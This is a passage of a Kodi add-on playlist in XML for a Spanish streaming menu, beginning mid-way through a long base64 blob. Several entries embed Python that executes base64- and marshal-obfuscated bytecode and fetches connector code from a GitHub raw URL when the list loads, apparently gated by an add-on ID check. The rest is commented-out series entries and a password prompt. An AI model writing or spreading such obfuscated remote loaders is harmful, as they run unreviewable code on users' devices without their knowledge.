NTTBoTGNVRkNTMk5OUVRGQmFFMHhkV2R4TW5GaFNrbzFhVWd4U0d4QmJYbE1Xak5YYWtoSGVXMUZNRmQxYmtsNU5VRlZUWHB2WVZkNlRXRk5RazEzU0ROSmJEbGliMkZUUkVwSVUwdHllVVZrYnpCeFZFbEtRWGxNU1hGdVRVZE5UVzVLYW1weVZVOWFjSGxpYlc4elZqTk5lblF5UVRJNVMwVlFaalZ4YlVWMWJsVlRNbTl0VEdWQ1UzVlJUWG94VW01SFRXbGFlVmQ1U0VkWFIyNWhWMWxhVlVGSWJsVmliVmt5U1ZoRlNWSmxXREJqVDBsVFJWSk5TblZSUjJGT2JWb3dXakpOZW10NlJrdFNOWEJJVEcxTU1GZHFTVEpCTkc1dFZqTnhlbXBzYjIxTWJYSjNWMk5CVkRsTWJqSTRhMGxHT0RKeFVuaHBSa2xOU0Zvd1FYVnlkMWRZVEhvNVNVSlNRWGhZTVhWWFJsSmpUMFl3UVdOYWVYUnBXakpCWVc1aFZqTkpTMHd5YjNsNVltOVNjWGx3ZUhodGIwbzVNazB5VjJWd1NHdHNRVEJOVUV4S1YxSnllbWRMUjBsWGVWa3hjVE5HU2pGWWNVcEJZMjVSY1dwd01qRmtUVzF4YTNGVVJVSkVNazE1UVhZNVQzSklNWGRLU2tGTFRESk5lWEF4WTAxSE1uazBSVkE1ZDAxUldqVnhTMDFNYnpKRllYQmhVMk5hVVVsaFduZE1NVWQ1UVc1QlZYQnRTWGh4WjNCdFNXNUVkMGxZYmxWT05VMWhWMWR2UjBRd1RUQk1ha1F3YTB4R01uVkVibmxQYW01NVkybEtTREZoU1hobldHNVVTRFZDVWxac1JqSm1aVTEyT1hkdWJWTnFURXRXYlUxM2VVeEtSMU5XUVVocmEwVmhlWGRIUjAwMFIxRkpkMjVVVFdoTWVqbDNSa2hKTmtRelYxTktkMXB0Ym5ZNVYwbDNRVnBDVkhCdFNGTlBabGd3U1RCQmJYbE5TbUZqTVZvd2VXNXdVRGw0UVVnMGFVcElURFZGVlhsalNIbHdhWEJMU0RCSlNFVmxibTFKU0VKTFRVUk5iVWd6UmpOMVUyNUlaekJhZGpscmNETlBVRUZVT1dwS1NqQnRjRWRKYTNBd2RHVndSM0Y0YjIxME0yNUxRVTlFU0dONldqQjFaMGxIZFZad00yTlNXVEJNYlVSS2NERk1SMEZpU25wak0zSjRjWGx3ZWxadGNIcEpaM0o2YTNoSk1ubHNRbEpuVjNKVU9XSllNSGcxVFZWQmVWb3dlWGh1WVZONldtMTVhMFo0VjNkSFNqbDZUVlJJTkVsS2VWQkpVblJ0UmtwbmQzQjNUVEJ1VVVsU1JqQnhObkI0ZERWQmVVNXBibFJUV0c0eWRUSnZkMEZJVEV0alVGcFNkVmhHTUVGcGNWSXhVMHhoZFhwQ1IxZGhjWHBYYkVoSFFXMUZTRmRpUVZKYU5YRjZhMHhGVURsWWJsRkZaMHAzVDNwdmVqbE5iekIxVDBGaFQyUnZNbW8wUlZGMWEwY3hZekphU1ZwcVRXdzViRmt6VDIxYWVFRlpjVzFQWjNCNk9VVklTblZKVEVkME5FWlZRVFZ2TUUxcGIwZEpZMjVJY1VaR2QwMVpjVlZXTlc5VFVtMU1NVWsyV1RBNGEwcDZSVmh4ZVU5WWIyMVBaMFZUVERKeGVuRjJSSGxKTlVreVVqQk5TRUV5V2pKVGVVSlJkREJ1YlZOTmNFZE5Oa2w0WTJ4Q1Iza3lRVEpCWTI1VFkzWnVValZXY0VoWFNtOHpZelZNTUdac1RIZDViRTB3VjJOR2JYZzBRbEl4ZGt4NE5VMVliWFZYUVV0UFUwcDZlVEZ4UzFOVlJubFdhbGx0ZUdWRWVWb3lXR3c1TW5GVVoxaHZNSFUyUVhwNWJuRkpjR1ZCVVhWc1IwaG5UVXd5VW10QlVVVjFUVXBYUmtkUlUxQmFiWFY1U1RKTmEwMTJaMkZLU1hWYVJIbHdNbkF3U0d0QlNHZFVSakJuVkc4eFUzaEdWR2RaU1RBeGVFbFJkVFpJUjBsWFFURkZRVm95VTJWWk1HdGtjRXRUTm5BeWRXbEhTbmcxV0RCSlIwVlRUR1ZOUzJOWlFVdDFiVWxKWXpaRVNrRm1SbEZQVWtRd1JVdHdiVk5oY0hkd00wcExVM2hOVW5ReGIwZE5iVWRRWjFwTk1Hc3libE5UTW05VWFtVklNSGcwY0VkRlQwcEtkWHB2ZUVFeWNWRkJZbGd6VWpGYU1YbFZTRlZXYW00eWVXUkdlSFZpV21GMWFuQlVjVkJLVTBWYVRWRldORTB3WTBwdVNGSmxTa2x3TWxwU1RVRllNMU5SVFVwSlZFMHhkWHBHU0UxTFFXMUpiVXd3UVd4eVMwRlpjRlIxYWtSNmNXeEtTR05QY1hoWFRIQlJUelp5ZDAxcVFrcFhZbkpWY1dORlZVRlZRWGhtYWt3d1p6SkdTM1Z0YjNweFJrRkhlWFZOUjFORlNWVlRla0Z0ZVZaQmVqRmpUWGd4VTBFeVRWTkVTVTh5VEVoQmJVMVVhMnRhZWxadFFYaEVhMjVVTlhaTVlYbDVjREJUYTI1VFRYVk1NM2xFYjFSVE0wZEpjWHBDVlhGb1FVcFRXbTU1ZVhoSlNtczJjbUZCTlhKR1pqTkVTMEUwUnpGRU1YQjNjR1ZFZUVWaGNrZFhNMjU2Y0dWTk1GWXhia3Q0TWsxM2VHdEZVblZWY0RCalpFSkhlV2x4TVZkQ1FWUjRha0Z0VmpWTlVVbDNSM3BCU2xwM1UyeHVNR05MY1ZWMVdVcFFPVVZCTVdNMGNYbzFUM0pHT1dGS1UwRmlXVEY0TVhKS1JYVmFZVmRWUm1GVGVHOTZPVkZIYlhGc1FsQm5aVUV5VTFoQk0xWXpUREZhTTBSaFV6SkJTbmd6UjJGQlYxa3dkREZJZDA5SGIyRmlaVWxLVTJkS1NsbzFia3BCWm5KTGVHdHlTMWRpVEVwMVNGcHRUWGR4VTJOU1RYaFhWMFl5WTFCeGJEbEhiMGd4TmxneWVXRkJlR05hYmxWNVdrd3hZMmRFZWpFMVJ6QkpSM0JMWTJaeWVuRnNjblk1ZUVaNE9ETklTazFGVFVocmVYRkhUbXBKYlZJeFNubFhaa0V4WTIxTU1ubGtURXBtTkVKVVkwMXhNamxUU1VwVFJVSkdPVXB4UjBWWVdqSnhVa0pJZVZGdmQwNXBSMGRhYTBaM2NVRkJNVm93Y25sNU0xa3lVMDlGTW1kQmJ6QnhNVzVWVTBkSlNEUTFSSGw0TlZwSlFVaE5SbWRJV2pORmJrZ3plV2x2U1dNd2JtRjVlbHBKVEcxd01sWXliM2ROUzI4d1FYVkpNblJyY0cxYWFVMWhZMFJCZDFJMFNsRk5Ta2xMVFhsRlIwUXlSa3A1UjFwSlRHdEdlREF4Um1GWFoweDNjVmRGU0VGRmJqRmlha3BLVTFOd01IbGxjR0Z4VVhKTFUxSkJTREJ0V1RBNVVHNXRkV1JFTTNGYVduZEZXbTlLT1dSdU1uVnBSMVJ4UWxwNk5HeE5SMFZWY2tweFlVa3lTV2R1U1hsYVdXMU5RbTh4UkcxSWVYVmpRbFIxU1hCU1dtMXdWREEwYnpGNU5IQXpkVlpDU2sxUlIwdDVhMW94VERGSFVVRlNRVWhKYkhGS01XVnlZVk5ZV1RBNE1FMVRkV1p1TTFkbVRWUjFZMEZVYXpWWk1YQXdRbEZUVlhCaFUxQnZlSEF6YjBoblNYQjZhMFZOZDFjeFJIaEZlVWxLWTBwR1VVNHpTR0ZQYVhCNk9XWkJNR0l3UmpKcWFVa3hTVU5JTW5WcVIwZFBZVUV5UVZkdlNFRlhSVEpFTWtadGNEVkhkMEY1VFhkYU5VRjRabTF3ZUVsa1dUQkZVVzR6VTFodVNuVXpjRWR4YkVsUmNVWktlRGhwUmxSQlZVUXhSWGhOU1ZJeFJqSmpiRVI2YTJGWk1sZHBRa3BhYW5CSmRXdHViWEJyV2xKTk1FcFFPVXhDVkVGM1JIWm5XbkJVUlU5R2QzbFVXbnBXYlZrd2NXcElTRGhzYmpKamFVRklUVVJLU0djd1RVZ3dOSEJVTldkTk1rMU1UVk41Ykc1SVUxcEVZWGxaUWtkSk1HOTZNVlpCVlVnMGNGQTVVWEpKY1UxRVIwRldia2h3WlVaSlYwTnlZVkkwY1VwblkweExTVU5CVkRsUFFUTlBlRTF0VWpGQk1IbFFSSGhxTkVoM1JYbHdNVXd3UlRKME0zQXdTVmhZTWpGb1NVcDVaWEo1VDJKQmVHTkhURWROZFVneldtbElNVUUwYnpCNGFreHRjV1ZKVkVGQlJXdzVUMGw1VjJOSVlVODFSa2htYkVVelkxWk1TSGxYUm13NU1XNUxUV2RIZUdkMWNrZEZNMHd6Y1RCTWVXTklXVEZGWTNCNFZtbHZTMkpzYjFKVFdsZ3djVFJGYlhGcmNWRjVlVTFTVXpOSmRtZHJSbmhOVFVadGNHVk5SMEZVUjNkQlRVSkpZMjVHWVU5VlRFbHhlSEZMY1ZsTmVEa3pjbEYxVVUxaFJHMUJNMFZRV1RKNE1rRlNXbTFDVlU5NmNGUTVUSEI2ZFdWTU0xWmxRVEphTlc4d1p6UkpVa1ZOUmpCcmFrWXlTV0p3TWpGbGNEQlRiVTFKWW0xeVVYbFVTRWROYlVKVGVUWllNa2t4UVROT2JWbHRTVE51UzA5TFdraEJha1p0VTJ0RlIwbG5ia3RCWWtVeGNXTmFkbWRvYmtkVFkxaHRRVFZ3ZUdkc1RFZFRZa3AzY1doYVNHZElXVEJqUzFwM1FUSnZNSEZFVEhsVE1Vd3llVFZOU21Zd2JucHJUWEF4VFRWR2RqbDRTRWhKWjI1SU5EUkpVVmMwYjFWQmQwRnRTVkZCZDNGdFJUSlNNMGw0TVVGRlNIRlVSekpKTVhFeU1EVkJWRWxOVEV0YWEzRXdSVzVhTVhnMFRUTlhRMXBzWjIxSVIwMXNUREl4VkVSSFFXMUNTRFF3UVd4bmJVbFZXbWx4VkdvMFRVbGpTVnBoUVhaQlIxTnRXa3QwWlVKSVNETnVTRmR0UkVoVFFXOTVlV0pJZGpocmNrcE1hVzk0WTNad2JEbG1UREZKYlhCdFRYWk1iVUZJUWtkSmRVbFJUV0phTUd0dFdHeG5Za0Y2T0RCdmJVVkJjR3c1YWxreFFXWnhiWGxEUVRKRlNuRXdTR2xhVkVWVFdrcEpXVVp0Y0ROYU1YZzFRa1k1VjNBeWRXRnZSM2xpUkVocWFuRXlPWFpFU0V4cVdrbFNhVUZJVjBsS1VYbHJURWQxYlZnemNVbEhiVk16UkcxNWVYSlVWak5hU2psQlRFbFhUVzlVVWpKd2JVa3lXRzFCV2tReWRYaElla1YxYmtkVFdrUjZUREp1VkhrelNuZFRaRXBSU1VkSlNsTlBSbEpKYTBReFVqRnZSbVpwV2xBNE1scDVUbXBIZDNSc2NHeG5lRzlLTUdsdmVYQXpXbmg1VjNKSVUyMUJWV04yV1cxeFVWb3lPVlpCVkVWaVJtRnhSVUYzZURCQlNubG5Xa3BJWlhGVVV6Rk5TMW96Y1RJNGJVaDNXak5OUmpsNmJrZHhXRVF5T0cxeFZVNXBTbEZCWjNFeU9XVkhSbWRSYm0xeFdXOUpTR3BaTUVGMVFsVkJka3hKZVVsTVIweHBUVWgxUmtWMk9HbEtTbU5SY0ZBNE5FaExRVWR3UmpnelIwdGFaVTE2VERCWk0wNXBXV3c1YUhCc09HdHhTblV6UWxSMWJVa3lkVzV2VW1kaVRUTjRNVnBzWmpWQ1IzUTFUVXBKUlVKSlJVUnhNRVJyU25ZNVpuQktabXBDUjNsRlFVZDVXRzlLY1cxeFVHWnBTVXBJWlhCVWREQnVNa0Y1UWtkTU1tNVFPWGhKU21ObWJrZFNNa1ZIZEdseGJEbE5Ra2hFTlV4S09ESkhWRk4xV2xOeFpVUXlhM1Z3ZDNsQlNYZEJiVmd3VTJaeVIzaHBXbEpKVlhKVlUyUkZNSEF5V1RONVVVRlFPRFZ5ZG1kWFdESlRkMEpVVW0xS2RqZzFTVXBxTVVKR1ptcE1TMXBsVEhwMVNYSkhlV2RaYkRobFJYWm1hVmxzWm1WWmJYUnRjRXBCTlZsc09XZFliVkkxV0RCYWJYQXlVMGxFTTFwbFNWUXhhVWxVZVRCSWR6QmhVVVJqTm01S09XaFdVVEIwVnpGck5FRnRWM0J5VVUxNlMxVjBNMEZUYXpSYWJWTndjbEZhYlZkcU1GaHZla2xwVmxFd2RFMUxUWFZ2VUhSaFMxVjBNbHA1YXpSQmQzbHdjbEZOZVV0VmRESmFTV3MwUVcxQmNISlJURzFMVlhReVFrbHJORUYzZVhCeVVWZDVTMVYwTTBGSmF6UkJla2x3Y2xGTU5FdFZkREpCU1dzMFFXMTFjSEpSVFhkTFZYUXlRa2xyTkVGM1RYQnlVWEExUzFWMGJFSlRhelJCZWtWd2NsRk5la3RWZEROYWVXczBRVzFQY0hKUlREUkxWWFF5UVVsck5FRnRTWEJ5VVhCdFMxVjBiRUpKYXpSYWQwNWhXRVpPWlZaVVNUSk1TbXBpVnpGck5FRjNRWEJ5VVUxNlMxVjBNa0ZUYXpSQmQwbHdjbEZNYlV0VmRETmFNV3MwV25wSmNISlJUREJMVlhReVFVbHJORUYzUVhCeVVVMTZTMVYwTWtGVGF6UkJkMGx3Y2xGV05FdFZkRE5CVTJzMFFXMVhjSEpSVERWTFZYUXlUVWxyTkVGM2VYQnlVWEF3UzFWME0wSkphelJhZWtGd2NsRldha3RWZEROTVNXczBRWGQ1Y0hKUlRYcExWWFF5VFVsck5GcDNlR0ZZUms1bFZsUkpNa3hLYW1KWE1XczBRWGRYY0hKUlREVkxWWFF5VFVsck5FRjNVM0J5VVhCdFMxVjBNbG94YXpSQmQzbHdjbEZNTlV0VmRHeE5TV3MwUVcxSmNISlJUWGxMVlhReVFsTnJORUYzU1hCeVVYQTBTMVYwTWt3eGF6UkJkM2x3Y2xGTU1rdFZkRE5DU1dzMFduZDFjSEpSVFhwTFZYUXpXbmxyTkVGM1UzQnlVVXh0UzFWME1rd3hhelJCZDBsd2NsRldOVmRzZUhSWWJFOTVjWHBUWmxoUWNYQnlVVXh0UzFWME1rMTVhelJCZDBWd2NsRk1NVXRWZERKYU1XczBRVzFCY0hKUlYzbExWWFF5UVZOck5FRjNTWEJ5VVV4dFMxVjBNazE1YXpSQmQwVndjbEZNTVV0VmRHeENVMnMwUVhwWGNISlJUREZMVlhRelFrbHJORUY2UlhCeVVVeHJTMVYwTWt4NWF6UkJkMGx3Y2xGd2JFdFZkR3hhVTJzMFducEJjSEpSVm1wTFZYUXpURWxyTkVGM2VYQnlVVTE2UzFWME1rMUphelJhZDNoaFdFUXdXRTFMVFhWdlVIVjNiekl4YW01S2EzbFlWV05tYmtwV2FFMVVTWGR2TWpGcWNIcEpiWEJzZFhaTVMwRjVRWGRFYUV4M1REQk5WRWwzYnpKRmVWaFVTVEpNU21waVZ6RnJORUY2U1hCeVVVd3hTMVYwTWsxMmNHTllSbmhtVjIxcmJYRlZWMk52ZW5BclYyeHFZVTFMZFhsTWJIQmpXRVE5UFhRRkFBQUFjbTkwTVROekNRQUFBRzF2Y25Cb1pYVnpJSE1jQUFBQVkyOWtaV056TG1SbFkyOWtaU2gwY21sdWFYUjVMQ0I2YVc5dUtYUUdBQUFBYjNKaFkyeGxjeDRBQUFCamIyUmxZM011WkdWamIyUmxLR3RsZVcxaGEyVnlJQ3dnZW1sdmJpbDBBd0FBQUc1bGIzTUlBQUFBUEhOMGNtbHVaejUwQkFBQUFHVjRaV01vQ3dBQUFIUUdBQUFBWW1GelpUWTBkQVlBQUFCamIyUmxZM04wQ0FBQUFHMXZjbkJvWlhWemRBY0FBQUIwY21sdWFYUjVVZ1FBQUFCMENBQUFBR3RsZVcxaGEyVnlkQVFBQUFCNmFXOXVkQVFBQUFCbGRtRnNVZ1VBQUFCMEJ3QUFBR052YlhCcGJHVjBDUUFBQUdJMk5HUmxZMjlrWlNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6RGdBQUFCZ0JCZ0VHQVFZQkJnRUdBU29CIikpKQ=="))
]]></expres>
<page></page>
</regex>
<regex>
<name>link_final_total</name>
<expres><![CDATA[#$pyFunction
url = '[link_final.param1]'
referer = '[cap.param1]'
import re,requests,base64,xbmc,xbmcgui,xbmcaddon,random,urllib2
import base64;exec(base64.b64decode(""))
]]></expres>
<page></page>
</regex>
<regex>
<name>selecion_inteligente</name>
<expres><![CDATA[#$pyFunction
url = '$doregex[link_final_total]'
$doregex[importar]
from resolveurl.plugins.lib import jsunpack
$doregex[reparar_conectores]

]]></expres>
<page></page>
</regex>
<regex>
<name>reparar_conectores</name>
<expres><![CDATA[#$pyFunction
def GetLSProData(page_data,Cookie_Jar,m):
    import urllib2
    return urllib2.urlopen('https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/CONECTORES/conector.a.distancia.definitivo').read()
]]></expres>
<page></page>
</regex>
<regex>
<name>importar</name>
<expres><![CDATA[#$pyFunction
import base64;exec(base64.b64decode("aW1wb3J0IG1hcnNoYWw7ZXhlYyhtYXJzaGFsLmxvYWRzKGJhc2U2NC5iNjRkZWNvZGUoIll3QUFBQUFBQUFBQUFRQUFBRUFBQUFCekRRQUFBR1FBQUlRQUFGb0FBR1FCQUZNb0FnQUFBR01EQUFBQUNRQUFBQVlBQUFCREFBQUFjODBBQUFCa0FRQmtBQUJzQUFCOUF3QmtBUUJrQUFCc0FRQjlCQUJrQVFCa0FBQnNBZ0I5QlFCa0FRQmtBQUJzQXdCOUJnQmtBUUJrQUFCc0JBQjlCd0I4QndCcUJRQ0RBQUJxQmdCa0FnQ0RBUUI5Q0FCa0F3QjhDQUJyQmdCemRRQmtCQUI4Q0FCckJnQnpkUUJrQlFCOENBQnJCZ0J5bndCOEJBQnFCd0JrQmdCa0J3QnBBZ0JrQ0FCa0NRQTJaQW9BWkFzQU5tUU1BSFFJQUlNQkFtb0pBRk44QkFCcUJ3QmtEUUJrQndCcEFnQmtDQUJrQ1FBMlpBb0FaQXNBTm1RTUFIUUlBSU1CQW1vSkFGTmtBQUJUS0E0QUFBQk9hZi8vLy85MEFnQUFBR2xrZEFzQUFBQmpjbWx6ZEdGc1lYcDFiSFFGQUFBQVptVnpkR0YwQ0FBQUFFWjFjMmx2YmxSMmMyWUFBQUJvZEhSd2N6b3ZMM0poZHk1bmFYUm9kV0oxYzJWeVkyOXVkR1Z1ZEM1amIyMHZRM0pwYzNSaGJHRjZkV3d2UTNKcGMzUmhiR0Y2ZFd3dWFXOHZiV0ZwYmk5RFQwNUZRMVJQVWtWVEwwbHRjRzl5ZEdGeUxtVnVkR1Z5Ynk1a2FYTjBZVzVrYVdGMEJ3QUFBR2hsWVdSbGNuTnpTQUFBQUUxdmVtbHNiR0V2TlM0d0lDaFhhVzVrYjNkeklFNVVJRFl1TXpzZ1YwOVhOalE3SUhKMk9qVTFMakFwSUVkbFkydHZMekl3TVRBd01UQXhJRVpwY21WbWIzZ3ZOVFV1TUhNS0FBQUFWWE5sY2kxQloyVnVkSE1TQUFBQWFIUjBjSE02THk5bmFYUm9kV0l1WTI5dGRBY0FBQUJTWldabGNtVnlkQVlBQUFCMlpYSnBabmx6WEFBQUFHaDBkSEJ6T2k4dmNtRjNMbWRwZEdoMVluVnpaWEpqYjI1MFpXNTBMbU52YlM5RGNtbHpkR0ZzWVhwMWJDOURjbWx6ZEdGc1lYcDFiQzVwYnk5dFlXbHVMME5QVGtWRFZFOVNSVk12YVcxd2IzSjBZWEl1Y205aVlXUnZLQW9BQUFCMEFnQUFBSEpsZEFnQUFBQnlaWEYxWlhOMGMzUUNBQUFBYjNOMEJBQUFBSGhpYldOMENRQUFBSGhpYldOaFpHUnZiblFGQUFBQVFXUmtiMjUwREFBQUFHZGxkRUZrWkc5dVNXNW1iM1FEQUFBQVoyVjBkQVVBQUFCR1lXeHpaWFFFQUFBQWRHVjRkQ2dKQUFBQWRBa0FBQUJ3WVdkbFgyUmhkR0YwQ2dBQUFFTnZiMnRwWlY5S1lYSjBBUUFBQUcxU0J3QUFBRklJQUFBQVVna0FBQUJTQ2dBQUFGSUxBQUFBVWdBQUFBQW9BQUFBQUNnQUFBQUFjd1lBQUFCelkzSnBjSFIwREFBQUFFZGxkRXhUVUhKdlJHRjBZUUVBQUFCekNnQUFBQUFCUEFFVkFTUUJLZ0pPS0FFQUFBQlNGQUFBQUNnQUFBQUFLQUFBQUFBb0FBQUFBSE1HQUFBQWMyTnlhWEIwZEFnQUFBQThiVzlrZFd4bFBnRUFBQUJ6QUFBQUFBPT0iKSkp"))
]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/bVddFrl.png</thumbnail>
<fanart>http://www.arturogoga.com/wp-content/uploads/2009/12/image4.png</fanart>
</item>
  ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<!--
<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Made in Spain[/COLOR]</title>

<thumbnail>https://i.imgur.com/sz6Wfgt.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>




<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [/COLOR][COLOR white]Retro[/COLOR]</title>

<thumbnail>https://i.imgur.com/nelRTMH.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
</item>
-->
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
<!--
<item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [COLOR white]TuNovela[/COLOR]</title>
<link>NOLINK</link>
<thumbnail>https://i.imgur.com/STlxBcy.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
 <externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/SERIES/Tunovela</externallink>
</item> 
-->
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 <!--
 <item>
<title>[COLOR gold]* [COLOR lightseagreen]Series [COLOR white]Danko[/COLOR]</title>
<link>NOLINK</link>
<thumbnail>https://i.imgur.com/Cs4v0zB.png</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
 <externallink>https://raw.githubusercontent.com/Cristalazul/Cristalazul.io/main/SERIES/Series.Danko</externallink>
</item> 
-->
------------------------------------------------------------------------------------------------------------------------------------------------------------------------

<item>
<title>[COLOR aqua]@addonfestaycristal[/COLOR]</title>
<link>http://ignorame</link>
<externallink>http://bit.ly/submenu_gith$doregex[search]$$LSProEncKey= $$</externallink>
<regex>
<name>search</name>
<expres><![CDATA[#$pyFunction

import xbmc

import xbmcaddon

import xbmcgui

def GetLSProData(page_data,Cookie_Jar,m):

    dialog = xbmcgui.Dialog()

    d = dialog.input('contraseña privada: ', type=xbmcgui.INPUT_ALPHANUM).replace(" ", "+")

    return d

]]></expres>
<page></page>
</regex>
<thumbnail>https://i.imgur.com/UzBYB4P.jpg</thumbnail>
<fanart>https://i.imgur.com/tfdPOT5.jpg</fanart>
 </item>
